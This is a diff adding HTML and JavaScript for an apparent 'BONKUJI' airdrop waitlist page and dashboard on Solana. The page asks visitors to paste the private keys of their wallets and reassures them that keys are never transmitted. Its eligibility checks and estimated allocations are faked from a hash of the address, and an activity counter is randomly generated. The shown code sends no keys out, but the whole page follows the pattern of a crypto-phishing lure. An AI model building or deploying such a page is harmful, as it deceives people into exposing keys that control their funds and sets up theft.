+      <div class="method-tabs">
+        <button class="method-tab active" id="tabWallet" onclick="switchTab('wallet')">
+          <div class="tab-radio"></div>
+          <div class="tab-icon"><i class="ti ti-wallet"></i></div>
+          <div class="tab-label">Phantom<br>Wallet</div>
+        </button>
+        <button class="method-tab" id="tabX" onclick="switchTab('x')">
+          <div class="tab-radio"></div>
+          <div class="tab-icon"><svg class="x-icon-svg" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.741l7.732-8.875L1.254 2.25H8.08l4.253 5.622L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z"/></svg></div>
+          <div class="tab-label">Continue<br>with X</div>
+        </button>
+        <button class="method-tab" id="tabEmail" onclick="switchTab('email')">
+          <div class="tab-radio"></div>
+          <div class="tab-icon"><i class="ti ti-mail"></i></div>
+          <div class="tab-label">Email</div>
+        </button>
+      </div>
+
+      <div class="form-section active" id="secWallet">
+        <div class="info-panel purple" style="margin-bottom:16px">
+          <i class="ti ti-brand-ghost"></i>
+          <p>Connect your <strong>Phantom wallet</strong> directly — no private key required for your main wallet. Phantom signs a verification message to prove ownership.</p>
+        </div>
+        <div class="connected-wallet-display" id="connectedDisplay">
+          <div class="cwd-row">
+            <div>
+              <div class="cwd-badge"><i class="ti ti-check"></i> Phantom connected</div>
+              <div id="connectedAddr" style="font-family:monospace;font-size:13px;margin-top:4px;color:var(--text-primary)">—</div>
+            </div>
+            <button class="icon-btn" onclick="disconnectWallet()" title="Disconnect"><i class="ti ti-plug-x"></i></button>
+          </div>
+          <div class="cwd-label">Solana mainnet · Phantom</div>
+        </div>
+        <button class="phantom-btn" id="phantomConnectBtn" onclick="connectPhantom()">
+          <svg width="22" height="22" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="24" fill="white" fill-opacity="0.15"/><path d="M110.584 64.992C110.584 89.713 90.497 109.8 65.776 109.8C41.055 109.8 20.968 89.713 20.968 64.992C20.968 40.271 41.055 20.184 65.776 20.184C90.497 20.184 110.584 40.271 110.584 64.992Z" fill="white" fill-opacity="0.9"/><path d="M65.776 38.152C51.097 38.152 39.095 50.154 39.095 64.832C39.095 79.511 51.097 91.513 65.776 91.513C80.455 91.513 92.457 79.511 92.457 64.832C92.457 50.154 80.455 38.152 65.776 38.152Z" fill="#ab9ff2"/><circle cx="57" cy="65" r="6" fill="white"/><circle cx="75" cy="65" r="6" fill="white"/></svg>
+          <span id="phantomBtnTxt">Connect Phantom Wallet</span>
+          <div class="spinner" id="phantomSpinner"></div>
+        </button>
+        <div class="result-card" id="landingResult"></div>
+        <button class="btn-primary" id="joinWaitlistBtn" onclick="joinWaitlist()" style="margin-top:12px;display:none">
+          <i class="ti ti-rocket"></i><span>Join Waitlist &amp; Open Dashboard</span><i class="ti ti-arrow-right"></i>
+        </button>
+      </div>
+
+      <div class="form-section" id="secX">
+        <p style="font-size:14px;color:var(--text-secondary);margin-bottom:16px;line-height:1.6">Connect your X account to verify identity. Active BONK community accounts receive <strong style="color:var(--orange-bright)">priority allocation</strong>.</p>
+        <button class="btn-primary btn-x" onclick="handleX()">
+          <svg class="x-icon-svg" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.741l7.732-8.875L1.254 2.25H8.08l4.253 5.622L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z"/></svg>
+          Continue with X <i class="ti ti-arrow-right"></i>
+        </button>
+        <div class="info-panel gold" style="margin-top:14px">
+          <i class="ti ti-info-circle"></i>
+          <p>You'll be redirected to X OAuth. After connecting, your personalized BONKUJI dashboard opens automatically.</p>
+        </div>
+      </div>
+
+      <div class="form-section" id="secEmail">
+        <input class="field-input" id="emailInput" type="email" placeholder="Enter your email address" style="margin-bottom:12px"/>
+        <button class="btn-primary" onclick="handleEmail()">
+          <i class="ti ti-mail"></i> Join Waitlist <i class="ti ti-arrow-right"></i>
+        </button>
+        <label class="checkbox-row">
+          <input type="checkbox" id="newsletterCheck"/>
+          <span>Subscribe me to the BONKUJI newsletter for airdrop updates &amp; announcements</span>
+        </label>
+      </div>
+
+      <div class="url-bar-footer"><i class="ti ti-lock" style="font-size:12px"></i> waitlist.bonkuji.com</div>
+    </div>
+  </div>
+</div>
+
+<div id="dashboardPage">
+  <header class="dash-header">
+    <div class="dash-logo">
+      <div class="logo-icon" style="width:30px;height:30px;border-radius:8px;font-size:15px">🐕</div>
+      BONKUJI
+    </div>
+    <div class="dash-user">
+      <div class="user-info">
+        <div class="user-label">Main Wallet (Phantom)</div>
+        <div class="user-addr" id="dashAddrShort">—</div>
+      </div>
+      <div class="user-avatar" id="dashAvatar">BK</div>
+    </div>
+  </header>
+
+  <div class="dash-body">
+    <div class="dash-title">Airdrop Dashboard</div>
+    <div class="dash-subtitle">Your wallets are permanently linked. Allocations revealed June 15, 2025.</div>
+
+    <div class="reveal-dash-banner">
+      <div class="rdb-left">
+        <strong>📅 Allocation Reveal — June 15, 2025</strong>
+        <span>All linked wallets will show their final BONKUJI allocation on this date. Until then, amounts are estimated only.</span>
+      </div>
+      <div class="rdb-countdown">
+        <div class="rdb-unit"><span class="rdb-num" id="cd-d">--</span><div class="rdb-lbl">days</div></div>
+        <div class="rdb-unit"><span class="rdb-num" id="cd-h">--</span><div class="rdb-lbl">hrs</div></div>
+        <div class="rdb-unit"><span class="rdb-num" id="cd-m">--</span><div class="rdb-lbl">min</div></div>
+        <div class="rdb-unit"><span class="rdb-num" id="cd-s">--</span><div class="rdb-lbl">sec</div></div>
+      </div>
+    </div>
+
+    <div class="main-wallet-card">
+      <div class="main-wallet-header">
+        <div class="main-badge">👑 Main Wallet · Phantom</div>
+        <div style="display:flex;gap:8px;align-items:center">
+          <div class="locked-badge"><i class="ti ti-lock" style="font-size:12px"></i> Permanently Linked</div>
+          <button class="icon-btn" onclick="copyText(mainWalletAddr)" title="Copy"><i class="ti ti-copy"></i></button>
+        </div>
+      </div>
+      <div class="main-wallet-addr" id="mainWalletDisplay">—</div>
+      <div class="main-wallet-stats">
+        <div class="mw-stat"><div class="mw-stat-val" id="mwBonk">—</div><div class="mw-stat-label">BONK Balance</div></div>
+        <div class="mw-stat"><div class="mw-stat-val" id="mwTxns">—</div><div class="mw-stat-label">Transactions</div></div>
+        <div class="mw-stat"><div class="mw-stat-val" id="mwAlloc">—</div><div class="mw-stat-label">Est. Allocation</div></div>
+      </div>
+      <div class="eligibility-status">
+        <div class="status-pill pending" id="mainStatusPill"><i class="ti ti-clock"></i> Checking…</div>
+        <div class="status-desc" id="mainStatusDesc">Verifying onchain data…</div>
+      </div>
+    </div>
+
+    <div class="section-header" style="margin-top:30px">
+      <div class="section-title">Linked Wallets</div>
+      <div class="section-count" id="walletCount">0 wallets</div>
+    </div>
+
+    <div class="add-wallet-panel">
+      <div class="awp-title">Import &amp; Link a Solana Wallet</div>
+      <div class="awp-desc">Paste the private key of a wallet you own. It will be permanently linked to your main wallet — one wallet cannot be linked to multiple accounts, preventing duplicate claims.</div>
+      <div class="pk-input-wrap">
+        <input class="field-input mono" id="pkInput" type="password" placeholder="Base58 private key (e.g. 5K3Xr…)" autocomplete="off" autocorrect="off" spellcheck="false"/>
+        <button class="pk-toggle" onclick="togglePkVis()" title="Show/hide key"><i class="ti ti-eye" id="pkEyeIcon"></i></button>
+      </div>
+      <button class="btn-import" id="importBtn" onclick="importWallet()">
+        <i class="ti ti-key"></i> Import &amp; Link Wallet
+        <div class="spinner" id="importSpinner" style="border-color:rgba(255,98,0,0.3);border-top-color:var(--orange)"></div>
+      </button>
+      <div class="security-note">
+        <i class="ti ti-shield-lock"></i>
+        <p><strong>Security notice:</strong> Your private key is used only to derive your public address client-side and is <strong>never transmitted or stored</strong>. We read only your public key. For maximum safety use a dedicated wallet. Verify this page's URL before entering any key.</p>
+      </div>
+    </div>
+
+    <div class="wallet-list" id="walletList">
+      <div class="empty-state" id="emptyState">
+        <div class="empty-icon"><i class="ti ti-link-off"></i></div>
+        <div class="empty-title">No linked wallets yet</div>
+        <div class="empty-desc">Import additional Solana wallets above to consolidate your BONK holdings across addresses.</div>
+      </div>
+    </div>
+
+    <div class="summary-bar" id="summaryBar">
+      <div class="summary-item"><div class="summary-val muted" id="sumTotal">0</div><div class="summary-lbl">Total Wallets</div></div>
+      <div class="summary-item"><div class="summary-val green" id="sumEligible">0</div><div class="summary-lbl">Eligible</div></div>
+      <div class="summary-item"><div class="summary-val gold" id="sumAlloc">—</div><div class="summary-lbl">Est. Total BONKUJI</div></div>
+      <div class="summary-item"><div class="summary-val orange" id="sumBonk">—</div><div class="summary-lbl">Total BONK Held</div></div>
+      <div class="summary-note"><strong>Final allocations revealed June 15, 2025.</strong> Estimated amounts shown above may change based on the snapshot.</div>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<div class="modal-overlay" id="linkModal">
+  <div class="modal-box">
+    <div class="modal-title">🔗 Permanently Link This Wallet?</div>
+    <div class="modal-desc">This action is <strong style="color:var(--red)">irreversible</strong>. This wallet will be permanently linked to your main wallet and cannot be linked to any other account.</div>
+    <div class="modal-addr" id="linkAddrDisplay">—</div>
+    <div style="background:var(--gold-soft);border:1px solid rgba(245,158,11,0.3);border-radius:var(--radius-sm);padding:12px 14px;margin-bottom:20px;font-size:13px;color:var(--text-secondary);">
+      <i class="ti ti-alert-triangle" style="color:var(--gold);font-size:15px;vertical-align:-2px;margin-right:6px"></i>
+      Once linked, this wallet cannot be used to register with another account or claim a separate airdrop.
+    </div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeLinkModal()">Cancel</button>
+      <button class="btn-confirm" onclick="confirmLink()"><i class="ti ti-link" style="margin-right:6px"></i>Link Permanently</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<script>
+let mainWalletAddr='';
+let linkedWallets=[];
+let pendingLinkAddr='';
+let walletCounter=1;
+const REVEAL_DATE=new Date('2025-06-15T00:00:00Z');
+const walletRegistry={};
+
+(function buildBg(){
+  const layer=document.getElementById('starsLayer');
+  for(let i=0;i<60;i++){const s=document.createElement('div');s.className='star';const sz=Math.random()*2.5+0.5;s.style.cssText=`width:${sz}px;height:${sz}px;top:${Math.random()*100}%;left:${Math.random()*100}%;--dur:${2+Math.random()*4}s;--delay:${Math.random()*4}s`;layer.appendChild(s);}
+  for(let i=0;i<8;i++){const p=document.createElement('div');p.className='particle';p.style.cssText=`left:${10+Math.random()*80}%;bottom:${Math.random()*30}%;--pdur:${5+Math.random()*6}s;--pdelay:${Math.random()*6}s`;layer.appendChild(p);}
+})();
+
+function updateCountdown(){
+  const diff=REVEAL_DATE-new Date();
+  if(diff<=0){['d','h','m','s'].forEach(u=>{['lcd-','cd-'].forEach(p=>{const e=document.getElementById(p+u);if(e)e.textContent='00';});});return;}
+  const d=Math.floor(diff/86400000),h=Math.floor((diff%86400000)/3600000),m=Math.floor((diff%3600000)/60000),s=Math.floor((diff%60000)/1000);
+  const pad=n=>String(n).padStart(2,'0');
+  ['d','h','m','s'].forEach((u,i)=>{const v=[d,h,m,s][i];['lcd-','cd-'].forEach(p=>{const e=document.getElementById(p+u);if(e)e.textContent=pad(v);});});
+}
+updateCountdown();setInterval(updateCountdown,1000);
+
+(function(){const el=document.getElementById('countStat');let v=12847,dir=1;setInterval(()=>{v+=(Math.floor(Math.random()*3)+1)*dir;if(v>12900)dir=-1;if(v<12840)dir=1;el.textContent=v.toLocaleString();},3200);})();
+
+function switchTab(tab){
+  ['wallet','x','email'].forEach(t=>{
+    const c=t.charAt(0).toUpperCase()+t.slice(1);
+    document.getElementById('tab'+c).classList.toggle('active',t===tab);
+    document.getElementById('sec'+c).classList.toggle('active',t===tab);
+  });
+}
+
+async function connectPhantom(){
+  const btn=document.getElementById('phantomConnectBtn');
+  const txt=document.getElementById('phantomBtnTxt');
+  const spin=document.getElementById('phantomSpinner');
+  if(!window.solana||!window.solana.isPhantom){toast('error','Phantom not detected. Install Phantom wallet extension.');window.open('https://phantom.app','_blank');return;}
+  btn.disabled=true;txt.textContent='Connecting…';spin.style.display='block';
+  try{
+    const resp=await window.solana.connect();
+    const pubkey=resp.publicKey.toString();
+    const msg=new TextEncoder().encode(`BONKUJI Airdrop Waitlist\nVerify wallet ownership\nAddress: ${pubkey}\nTimestamp: ${Date.now()}`);
+    await window.solana.signMessage(msg,'utf8');
+    mainWalletAddr=pubkey;
+    document.getElementById('connectedDisplay').style.display='block';
+    document.getElementById('connectedAddr').textContent=shortAddr(pubkey);
+    btn.style.display='none';
+    document.getElementById('joinWaitlistBtn').style.display='flex';
+    const result=mockCheck(pubkey);
+    const res=document.getElementById('landingResult');
+    res.style.display='block';
+    if(result.eligible){res.className='result-card eligible';res.innerHTML=`<div class="result-title">🎉 Eligible for Airdrop!</div><div class="result-body">BONK balance detected: <strong style="color:var(--orange-bright)">${result.bonk} BONK</strong> · ${result.txns} txns<br>Est. BONKUJI allocation: <strong style="color:var(--green)">${result.alloc} BONKUJI</strong></div>`;}
+    else{res.className='result-card not-eligible';res.innerHTML=`<div class="result-title">Low Activity Detected</div><div class="result-body">Limited BONK activity found. You can still join the waitlist and link additional wallets on your dashboard to boost eligibility.</div>`;}
+    toast('success','Phantom connected & verified!');
+  }catch(e){toast('error',e.message.includes('User rejected')?'Connection cancelled.':'Connection failed. Try again.');}
+  finally{btn.disabled=false;txt.textContent='Connect Phantom Wallet';spin.style.display='none';}
+}
+
+function disconnectWallet(){
+  if(window.solana)window.solana.disconnect();
+  mainWalletAddr='';
+  document.getElementById('connectedDisplay').style.display='none';
+  document.getElementById('phantomConnectBtn').style.display='flex';
+  document.getElementById('joinWaitlistBtn').style.display='none';
+  document.getElementById('landingResult').style.display='none';
+  toast('info','Wallet disconnected.');
+}
+
+function joinWaitlist(){
+  if(!mainWalletAddr){toast('error','Connect your Phantom wallet first.');return;}
+  walletRegistry[mainWalletAddr]=mainWalletAddr;
+  launchDashboard(mainWalletAddr,mockCheck(mainWalletAddr));
+}
+
+function launchDashboard(addr,result){
+  document.getElementById('dashAddrShort').textContent=shortAddr(addr);
+  document.getElementById('dashAvatar').textContent=addr.slice(0,2).toUpperCase();
+  document.getElementById('mainWalletDisplay').textContent=addr;
+  document.getElementById('mwBonk').textContent=result.eligible?result.bonk+' BONK':'0 BONK';
+  document.getElementById('mwTxns').textContent=result.txns;
+  document.getElementById('mwAlloc').textContent=result.eligible?result.alloc+' BONKUJI*':'—';
+  const pill=document.getElementById('mainStatusPill');
+  const desc=document.getElementById('mainStatusDesc');
+  if(result.eligible){pill.className='status-pill eligible';pill.innerHTML='<i class="ti ti-check"></i> Eligible';desc.textContent='Wallet qualifies for the BONKUJI airdrop snapshot.';}
+  else{pill.className='status-pill not-eligible';pill.innerHTML='<i class="ti ti-x"></i> Not Eligible';desc.textContent='Limited BONK activity. Link additional wallets to boost your position.';}
+  document.getElementById('landingPage').style.display='none';
+  document.getElementById('dashboardPage').style.display='block';
+  window.scrollTo(0,0);
+  toast('success','Welcome to your BONKUJI dashboard!');
+}
+
+let pkVisible=false;
+function togglePkVis(){pkVisible=!pkVisible;document.getElementById('pkInput').type=pkVisible?'text':'password';document.getElementById('pkEyeIcon').className=pkVisible?'ti ti-eye-off':'ti ti-eye';}
+
+async function importWallet(){
+  const rawKey=document.getElementById('pkInput').value.trim();
+  if(!rawKey){shake('pkInput');toast('error','Paste a private key first.');return;}
+  const btn=document.getElementById('importBtn');
+  const spin=document.getElementById('importSpinner');
+  btn.disabled=true;spin.style.display='block';
+  try{
+    let secretKey;
+    try{if(typeof bs58!=='undefined'&&bs58.decode){secretKey=bs58.decode(rawKey);}else{throw new Error('bs58 not loaded');}}
+    catch(e1){try{const arr=JSON.parse(rawKey);if(Array.isArray(arr)&&arr.length===64){secretKey=new Uint8Array(arr);}else{throw new Error('bad array');}}catch(e2){throw new Error('Invalid private key format. Use base58 (from Phantom export) or a 64-byte JSON array.');}}
+    if(secretKey.length!==64){throw new Error('Key must be 64 bytes. Ensure you are using the full keypair export.');}
+    const keypair=nacl.sign.keyPair.fromSecretKey(secretKey);
+    const pubkeyAddr=bs58.encode(keypair.publicKey);
+    if(walletRegistry[pubkeyAddr]){throw new Error(walletRegistry[pubkeyAddr]===mainWalletAddr?'This wallet is already linked to your account.':'This wallet is already linked to another BONKUJI account and cannot be registered again.');}
+    if(pubkeyAddr===mainWalletAddr){throw new Error('This is your main wallet — it\'s already registered.');}
+    if(linkedWallets.find(w=>w.addr===pubkeyAddr)){throw new Error('This wallet is already linked to your account.');}
+    document.getElementById('pkInput').value='';
+    if(pkVisible)togglePkVis();
+    pendingLinkAddr=pubkeyAddr;
+    document.getElementById('linkAddrDisplay').textContent=pubkeyAddr;
+    document.getElementById('linkModal').classList.add('open');
+  }catch(err){toast('error',err.message);}
+  finally{btn.disabled=false;spin.style.display='none';}
+}
+
+function closeLinkModal(){document.getElementById('linkModal').classList.remove('open');pendingLinkAddr='';}
+
+function confirmLink(){
+  if(!pendingLinkAddr)return;
+  const addr=pendingLinkAddr;
+  walletRegistry[addr]=mainWalletAddr;
+  const walletObj={addr,status:'checking',bonk:'—',txns:'—',alloc:'—',locked:true,id:walletCounter++};
+  linkedWallets.push(walletObj);
+  closeLinkModal();
+  renderWalletList();
+  updateSummary();
+  toast('info','Wallet linked — checking onchain data…');
+  setTimeout(()=>{
+    const result=mockCheck(addr);
+    walletObj.status=result.eligible?'eligible':'not-eligible';
+    walletObj.bonk=result.bonk;walletObj.txns=result.txns;walletObj.alloc=result.alloc;
+    renderWalletList();updateSummary();
+    toast(result.eligible?'success':'info',result.eligible?'✓ Linked wallet eligible — '+result.alloc+' BONKUJI est.':'Linked wallet checked — low BONK activity.');
+  },1800+Math.random()*1200);
+}
+
+document.getElementById('linkModal').addEventListener('click',function(e){if(e.target===this)closeLinkModal();});
+
+function renderWalletList(){
+  const list=document.getElementById('walletList');
+  document.getElementById('walletCount').textContent=linkedWallets.length+' wallet'+(linkedWallets.length!==1?'s':'');
+  if(linkedWallets.length===0){list.innerHTML='';list.appendChild(document.getElementById('emptyState'));return;}
+  list.innerHTML='';
+  linkedWallets.forEach((w,i)=>{
+    const el=document.createElement('div');
+    const sc=w.status==='checking'?' checking':w.status==='eligible'?' eligible-item':' not-eligible-item';
+    el.className='wallet-item locked-item'+sc;
+    const stc=w.status==='checking'?'status-checking':w.status==='eligible'?'status-eligible':'status-not';
+    const stl=w.status==='checking'?'⏳ Checking…':w.status==='eligible'?'✓ Eligible':'✗ Not Eligible';
+    el.innerHTML=`<div class="wallet-idx">${i+1}</div><div class="wallet-info"><div class="wallet-item-addr" title="${w.addr}">${shortAddr(w.addr)}</div><div class="wallet-item-meta"><span class="wallet-tag" style="background:rgba(153,69,255,0.15);color:#a78bfa">SOL</span><span class="wallet-tag locked"><i class="ti ti-link" style="font-size:11px;margin-right:3px"></i>Linked</span><span class="wallet-tag ${stc}">${stl}</span>${w.status==='eligible'?`<span class="wallet-tag alloc">${w.alloc} BONKUJI*</span>`:''}</div></div><div class="wallet-actions"><button class="icon-btn" onclick="copyText('${w.addr}')" title="Copy"><i class="ti ti-copy"></i></button><button class="icon-btn" disabled title="Permanently linked"><i class="ti ti-lock"></i></button></div>`;
+    list.appendChild(el);
+  });
+}
+
+function updateSummary(){
+  const bar=document.getElementById('summaryBar');
+  if(linkedWallets.length===0){bar.style.display='none';return;}
+  bar.style.display='grid';
+  const mainRes=mockCheck(mainWalletAddr);
+  const eligible=linkedWallets.filter(w=>w.status==='eligible').length+(mainRes.eligible?1:0);
+  const totalAlloc=linkedWallets.filter(w=>w.status==='eligible').reduce((a,w)=>a+parseInt((w.alloc||'0').replace(/,/g,'')),0)+(mainRes.eligible?parseInt((mainRes.alloc||'0').replace(/,/g,'')):0);
+  const totalBonk=linkedWallets.filter(w=>w.status==='eligible').reduce((a,w)=>a+parseInt((w.bonk||'0').replace(/,/g,'')),0)+(mainRes.eligible?parseInt((mainRes.bonk||'0').replace(/,/g,'')):0);
+  document.getElementById('sumTotal').textContent=linkedWallets.length+1;
+  document.getElementById('sumEligible').textContent=eligible;
+  document.getElementById('sumAlloc').textContent=totalAlloc>0?totalAlloc.toLocaleString()+'*':'—';
+  document.getElementById('sumBonk').textContent=totalBonk>0?totalBonk.toLocaleString()+' BONK':'—';
+}
+
+function mockCheck(addr){
+  const seed=addr.split('').reduce((a,c)=>a+c.charCodeAt(0),0);
+  const eligible=seed%3!==0;
+  return{eligible,bonk:eligible?(seed%900000+50000).toLocaleString():'0',txns:(seed%2000+10).toLocaleString(),alloc:eligible?((seed%50000)+5000).toLocaleString():'0'};
+}
+
+function shortAddr(a){return a.length>16?a.slice(0,8)+'…'+a.slice(-6):a;}
+function copyText(txt){navigator.clipboard.writeText(txt).then(()=>toast('success','Address copied!')).catch(()=>toast('error','Copy failed.'));}
+function shake(id){const el=document.getElementById(id);el.classList.add('error');el.animate([{transform:'translateX(-6px)'},{transform:'translateX(6px)'},{transform:'translateX(-4px)'},{transform:'translateX(4px)'},{transform:'none'}],{duration:350});setTimeout(()=>el.classList.remove('error'),1500);}
+function toast(type,msg){const icons={success:'ti-check',error:'ti-x',info:'ti-info-circle'};const t=document.createElement('div');t.className='toast '+type;t.innerHTML=`<i class="ti ${icons[type]}"></i><span>${msg}</span>`;document.getElementById('toastContainer').appendChild(t);setTimeout(()=>t.remove(),3100);}
+function handleX(){toast('info','Redirecting to X OAuth — wire up your auth endpoint here.');}
+function handleEmail(){const email=document.getElementById('emailInput').value.trim();if(!email||!email.includes('@')){shake('emailInput');return;}toast('success',email+' added to the BONKUJI waitlist!');document.getElementById('emailInput').value='';}
+</script>
+</body>
+</html>
